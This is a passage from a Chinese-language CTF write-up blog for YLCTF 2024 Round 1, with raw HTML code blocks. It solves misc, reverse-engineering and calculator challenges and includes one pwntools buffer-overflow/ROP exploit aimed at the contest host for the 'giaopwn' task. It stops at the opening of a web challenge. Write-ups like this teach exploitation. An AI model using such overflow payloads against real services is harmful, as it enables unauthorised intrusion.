</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Model Accuracy: </span><span style=color:#e6db74>{</span>accuracy<span style=color:#e6db74>:</span><span style=color:#e6db74>.2f</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> y_pred
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>make_predictions</span>(model, X_test):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> model<span style=color:#f92672>.</span>predict(X_test)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>save_results</span>(predictions, output_file):
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> pd<span style=color:#f92672>.</span>DataFrame({<span style=color:#e6db74>&#39;Label&#39;</span>: predictions})
</span></span><span style=display:flex><span>    result<span style=color:#f92672>.</span>index <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>  <span style=color:#75715e># Start index at 1</span>
</span></span><span style=display:flex><span>    result<span style=color:#f92672>.</span>index<span style=color:#f92672>.</span>name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;id&#39;</span>  <span style=color:#75715e># Rename index to &#39;id&#39;</span>
</span></span><span style=display:flex><span>    result<span style=color:#f92672>.</span>to_csv(output_file, index<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)  <span style=color:#75715e># Ensure the index is saved</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#75715e># Load and preprocess data</span>
</span></span><span style=display:flex><span>    X, y, test_data <span style=color:#f92672>=</span> load_and_preprocess_data(<span style=color:#e6db74>&#39;train.csv&#39;</span>, <span style=color:#e6db74>&#39;test.csv&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Split the training data into training and validation sets</span>
</span></span><span style=display:flex><span>    X_train, X_val, y_train, y_val <span style=color:#f92672>=</span> train_test_split(X, y, test_size<span style=color:#f92672>=</span><span style=color:#ae81ff>0.1</span>, random_state<span style=color:#f92672>=</span><span style=color:#ae81ff>42</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Train the model</span>
</span></span><span style=display:flex><span>    model <span style=color:#f92672>=</span> train_model(X_train, y_train)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Evaluate the model</span>
</span></span><span style=display:flex><span>    evaluate_model(model, X_val, y_val)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Make predictions on the test data</span>
</span></span><span style=display:flex><span>    test_preds <span style=color:#f92672>=</span> make_predictions(model, test_data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Save the results</span>
</span></span><span style=display:flex><span>    save_results(test_preds, <span style=color:#e6db74>&#39;result.csv&#39;</span>)
</span></span></code></pre></div><h5 id=round-1-whatmusic>[Round 1] whatmusic</h5><p>可以发现password单独解压，010研究是图片逆转写个脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;password&#39;</span>,<span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;flag&#39;</span>,<span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> g:
</span></span><span style=display:flex><span>      g<span style=color:#f92672>.</span>write(f<span style=color:#f92672>.</span>read()[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span></code></pre></div><p>然后导入010改文件尾，得到图片，然后还需要镜像一下，再进行在线网站的镜像处理得到password，然后进行解压</p><p><img alt=result loading=lazy src=/posts/ctf/ylctf2024/result.png></p><p>然后就没有思路了，给了hint也看不懂，信息收集后发现</p><p><img alt=music1 loading=lazy src=/posts/ctf/ylctf2024/music1.png></p><p>死去的记忆痛击我，在今年的iscc里面就有一题是github上面的lyra项目转音频得到wav的题目，主要是要搭建环境，我这里用了香港的vps搭建版本ubuntu20,参考文章<a href=https://blog.csdn.net/qq_36959443/article/details/116136965>Lyra编码器基础环境搭建_lyra dajian-CSDN博客</a></p><p><img alt=music2 loading=lazy src=/posts/ctf/ylctf2024/music2.png></p><p>环境构造搭好之后用xftp传入文件然后得到wav,多听几遍得到了flag</p><p><img alt=music3 loading=lazy src=/posts/ctf/ylctf2024/music3.png></p><h4 id=pwn>Pwn</h4><h5 id=round-1-giaopwn>[Round 1] giaopwn</h5><p><img alt=giaopwn loading=lazy src=/posts/ctf/ylctf2024/giaopwn.png></p><p>有nx保护</p><p>vuln有溢出点，查一下是有system和cat flag的</p><p><img alt=giaopwn2 loading=lazy src=/posts/ctf/ylctf2024/giaopwn2.png></p><p><img alt=giao loading=lazy src=/posts/ctf/ylctf2024/giao.png></p><p>利用寄存器rbi放入地址</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;challenge.yuanloo.com&#34;</span>,<span style=color:#ae81ff>44805</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>0x28</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x400743</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x601048</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x4006D2</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p><img alt=giao1 loading=lazy src=/posts/ctf/ylctf2024/giao1.png></p><h4 id=re>Re</h4><h5 id=round1xor>[round1]xor</h5><p>简单测试一下发现有upx，脱壳一下</p><p><img alt=xor loading=lazy src=/posts/ctf/ylctf2024/xor.png></p><p>分析一下简单的异或直接gpt梭个脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>encrypted_bytes <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x45</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x5f</span>, <span style=color:#ae81ff>0x48</span>, <span style=color:#ae81ff>0x5A</span>, <span style=color:#ae81ff>0x67</span>, <span style=color:#ae81ff>0x25</span>, <span style=color:#ae81ff>0x2F</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x7E</span>, <span style=color:#ae81ff>0x7D</span>, <span style=color:#ae81ff>0x79</span>, <span style=color:#ae81ff>0x29</span>, <span style=color:#ae81ff>0x7A</span>, <span style=color:#ae81ff>0x7D</span>, <span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x7D</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x29</span>, <span style=color:#ae81ff>0x7D</span>, <span style=color:#ae81ff>0x2E</span>, <span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x28</span>, <span style=color:#ae81ff>0x7D</span>, <span style=color:#ae81ff>0x28</span>, <span style=color:#ae81ff>0x2B</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x25</span>, <span style=color:#ae81ff>0x2A</span>, <span style=color:#ae81ff>0x25</span>, <span style=color:#ae81ff>0x2D</span>, <span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x2B</span>, <span style=color:#ae81ff>0x79</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x2A</span>, <span style=color:#ae81ff>0x2B</span>, <span style=color:#ae81ff>0x29</span>, <span style=color:#ae81ff>0x2B</span>, <span style=color:#ae81ff>0x29</span>, <span style=color:#ae81ff>0x79</span>, <span style=color:#ae81ff>0x28</span>, <span style=color:#ae81ff>0x2A</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x2F</span>, <span style=color:#ae81ff>0x29</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x1C</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 解密函数</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(encrypted_bytes):
</span></span><span style=display:flex><span>    decrypted_bytes <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> byte <span style=color:#f92672>in</span> encrypted_bytes:
</span></span><span style=display:flex><span>        decrypted_byte <span style=color:#f92672>=</span> byte <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x1C</span>  
</span></span><span style=display:flex><span>        decrypted_bytes<span style=color:#f92672>.</span>append(decrypted_byte)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> decrypted_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>decrypted_values <span style=color:#f92672>=</span> decrypt(encrypted_bytes)
</span></span><span style=display:flex><span>decrypted_string <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(chr(b) <span style=color:#66d9ef>for</span> b <span style=color:#f92672>in</span> decrypted_values)
</span></span><span style=display:flex><span>print(decrypted_string)
</span></span></code></pre></div><h5 id=round1ezgo>[round1]ezgo</h5><p>ida看一下加密逻辑</p><p><img alt=ezgo loading=lazy src=/posts/ctf/ylctf2024/ezgo.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>encrypted_bytes <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>122</span>, <span style=color:#ae81ff>116</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>127</span>, <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>94</span>, <span style=color:#ae81ff>90</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>15</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>120</span>, <span style=color:#ae81ff>113</span>, <span style=color:#ae81ff>118</span>, <span style=color:#ae81ff>110</span>, <span style=color:#ae81ff>34</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>112</span>, <span style=color:#ae81ff>36</span>, <span style=color:#ae81ff>101</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>125</span>, <span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>121</span>, <span style=color:#ae81ff>47</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>119</span>, <span style=color:#ae81ff>119</span>, <span style=color:#ae81ff>53</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>127</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>100</span>, <span style=color:#ae81ff>110</span>, <span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>109</span>, <span style=color:#ae81ff>57</span>, <span style=color:#ae81ff>98</span>, <span style=color:#ae81ff>56</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>57</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>34</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(encrypted):
</span></span><span style=display:flex><span>    decrypted <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i, byte <span style=color:#f92672>in</span> enumerate(encrypted):
</span></span><span style=display:flex><span>        decrypted_byte <span style=color:#f92672>=</span> byte <span style=color:#f92672>^</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>53</span>) 
</span></span><span style=display:flex><span>        decrypted<span style=color:#f92672>.</span>append(decrypted_byte)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes(decrypted)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>decrypted_bytes <span style=color:#f92672>=</span> decrypt(encrypted_bytes)
</span></span><span style=display:flex><span>print(decrypted_bytes<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>, errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span>))
</span></span></code></pre></div><h5 id=round1xorplus>[round1]xorplus</h5><p>ida打开分析一下是rc4的加密逻辑，没学会，一股脑把加密逻辑扔给claude帮我解密，出脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rc4_init</span>(key):
</span></span><span style=display:flex><span>    S <span style=color:#f92672>=</span> list(range(<span style=color:#ae81ff>256</span>))
</span></span><span style=display:flex><span>    j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>256</span>):
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> S[i] <span style=color:#f92672>+</span> ord(key[i <span style=color:#f92672>%</span> len(key)]) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1300</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        S[i], S[j] <span style=color:#f92672>=</span> S[j], S[i]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> S
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rc4_crypt</span>(S, data):
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> byte <span style=color:#f92672>in</span> data:
</span></span><span style=display:flex><span>        i <span style=color:#f92672>=</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> S[i]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        S[i], S[j] <span style=color:#f92672>=</span> S[j], S[i]
</span></span><span style=display:flex><span>        k <span style=color:#f92672>=</span> S[(S[i] <span style=color:#f92672>+</span> S[j]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>]
</span></span><span style=display:flex><span>        result<span style=color:#f92672>.</span>append(((byte <span style=color:#f92672>-</span> <span style=color:#ae81ff>20</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFF</span>) <span style=color:#f92672>^</span> k)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes(result)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;welcometoylctf&#34;</span>
</span></span><span style=display:flex><span>    encrypted_data <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0x91</span>, <span style=color:#ae81ff>0x86</span>, <span style=color:#ae81ff>0x1b</span>, <span style=color:#ae81ff>0x2d</span>, <span style=color:#ae81ff>0x9e</span>, <span style=color:#ae81ff>0x6f</span>, <span style=color:#ae81ff>0x57</span>, <span style=color:#ae81ff>0x5d</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0xec</span>, <span style=color:#ae81ff>0xa3</span>, <span style=color:#ae81ff>0x9f</span>, <span style=color:#ae81ff>0xcd</span>, <span style=color:#ae81ff>0x89</span>, <span style=color:#ae81ff>0x22</span>, <span style=color:#ae81ff>0x65</span>,
</span></span><span style=display:flex><span>                      <span style=color:#ae81ff>0x3b</span>, <span style=color:#ae81ff>0xa3</span>, <span style=color:#ae81ff>0x60</span>, <span style=color:#ae81ff>0x2d</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x54</span>, <span style=color:#ae81ff>0x78</span>, <span style=color:#ae81ff>0x67</span>, <span style=color:#ae81ff>0x6c</span>, <span style=color:#ae81ff>0x4e</span>, <span style=color:#ae81ff>0x81</span>, <span style=color:#ae81ff>0x53</span>, <span style=color:#ae81ff>0x4d</span>, <span style=color:#ae81ff>0x26</span>, <span style=color:#ae81ff>0x8</span>, <span style=color:#ae81ff>0x96</span>,
</span></span><span style=display:flex><span>                      <span style=color:#ae81ff>0x84</span>, <span style=color:#ae81ff>0x46</span>, <span style=color:#ae81ff>0x29</span>, <span style=color:#ae81ff>0xc5</span>, <span style=color:#ae81ff>0xb4</span>, <span style=color:#ae81ff>0x7e</span>, <span style=color:#ae81ff>0x29</span>, <span style=color:#ae81ff>0xc5</span>, <span style=color:#ae81ff>0xb9</span>, <span style=color:#ae81ff>0x87</span>, <span style=color:#ae81ff>0xa6</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    S <span style=color:#f92672>=</span> rc4_init(key)
</span></span><span style=display:flex><span>    decrypted <span style=color:#f92672>=</span> rc4_crypt(S, encrypted_data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Decrypted message:&#34;</span>, decrypted<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><h5 id=round-1calc>[round 1]calc</h5><p>分析解密的源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;math.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> Stack {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>double</span><span style=color:#f92672>*</span> low;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> size;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>double</span><span style=color:#f92672>*</span> top;
</span></span><span style=display:flex><span>} stack;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>init</span>(stack<span style=color:#f92672>*</span> s) {
</span></span><span style=display:flex><span>    s<span style=color:#f92672>-&gt;</span>size <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>;
</span></span><span style=display:flex><span>    s<span style=color:#f92672>-&gt;</span>low <span style=color:#f92672>=</span> (<span style=color:#66d9ef>double</span><span style=color:#f92672>*</span>)<span style=color:#a6e22e>malloc</span>((<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>double</span>)) <span style=color:#f92672>*</span> <span style=color:#ae81ff>100</span>);
</span></span><span style=display:flex><span>    s<span style=color:#f92672>-&gt;</span>top <span style=color:#f92672>=</span> s<span style=color:#f92672>-&gt;</span>low;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>push</span>(stack<span style=color:#f92672>*</span> s, <span style=color:#66d9ef>double</span> e) {
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>(s<span style=color:#f92672>-&gt;</span>top) <span style=color:#f92672>=</span> e;
</span></span><span style=display:flex><span>    s<span style=color:#f92672>-&gt;</span>top<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>pop</span>(stack<span style=color:#f92672>*</span> s, <span style=color:#66d9ef>double</span><span style=color:#f92672>*</span> e) {
</span></span><span style=display:flex><span>    s<span style=color:#f92672>-&gt;</span>top<span style=color:#f92672>--</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>e <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(s<span style=color:#f92672>-&gt;</span>top);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setbuf</span>(stdin, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setbuf</span>(stdout, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    stack s;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>double</span> e, d;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> ch;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>double</span> d, e;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>init</span>(<span style=color:#f92672>&amp;</span>s);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> num[<span style=color:#ae81ff>100</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;input data, end of &#39;#&#39;&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%c&#34;</span>, <span style=color:#f92672>&amp;</span>ch);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (ch <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;#&#39;</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (ch <span style=color:#f92672>&gt;=</span> <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>&amp;&amp;</span> ch <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;9&#39;</span>) {
</span></span><span style=display:flex><span>            num[i] <span style=color:#f92672>=</span> ch;
</span></span><span style=display:flex><span>            i<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%c&#34;</span>, <span style=color:#f92672>&amp;</span>ch);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (ch <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39; &#39;</span>) {
</span></span><span style=display:flex><span>            num[i] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span>            d <span style=color:#f92672>=</span> <span style=color:#a6e22e>atof</span>(num);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>push</span>(<span style=color:#f92672>&amp;</span>s, d);
</span></span><span style=display:flex><span>            i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>switch</span> (ch) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;+&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>pop</span>(<span style=color:#f92672>&amp;</span>s, <span style=color:#f92672>&amp;</span>d);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>pop</span>(<span style=color:#f92672>&amp;</span>s, <span style=color:#f92672>&amp;</span>e);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>push</span>(<span style=color:#f92672>&amp;</span>s, e <span style=color:#f92672>+</span> d);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;-&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>pop</span>(<span style=color:#f92672>&amp;</span>s, <span style=color:#f92672>&amp;</span>d);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>pop</span>(<span style=color:#f92672>&amp;</span>s, <span style=color:#f92672>&amp;</span>e);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>push</span>(<span style=color:#f92672>&amp;</span>s, e <span style=color:#f92672>-</span> d);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;*&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>pop</span>(<span style=color:#f92672>&amp;</span>s, <span style=color:#f92672>&amp;</span>d);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>pop</span>(<span style=color:#f92672>&amp;</span>s, <span style=color:#f92672>&amp;</span>e);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>push</span>(<span style=color:#f92672>&amp;</span>s, e <span style=color:#f92672>*</span> d);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>pop</span>(<span style=color:#f92672>&amp;</span>s, <span style=color:#f92672>&amp;</span>d);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>pop</span>(<span style=color:#f92672>&amp;</span>s, <span style=color:#f92672>&amp;</span>e);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>push</span>(<span style=color:#f92672>&amp;</span>s, e <span style=color:#f92672>/</span> d);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%c&#34;</span>, <span style=color:#f92672>&amp;</span>ch);
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (d <span style=color:#f92672>==</span> <span style=color:#ae81ff>125</span>) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, <span style=color:#a6e22e>getenv</span>(<span style=color:#e6db74>&#34;GZCTF_FLAG&#34;</span>));
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>程序使用逆波兰表示法（Reverse Polish Notation，RPN）进行计算。当栈顶的值达到 125 时，程序会输出 GZCTF_FLAG。</p><p>在栈顶产生值 125。所以能在栈顶产生 125 的 RPN 表达应该是有效的输入</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>5 5 <span style=font-style:italic>* 5 *</span> #
</span></span></code></pre></div><p>尝试了一些其他的没有成功这个是成功的</p><h4 id=web>Web</h4><h5 id=round-1-disal>[Round 1] Disal</h5><p>看不出东西，看看robots.txt，有提示去f1ag.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
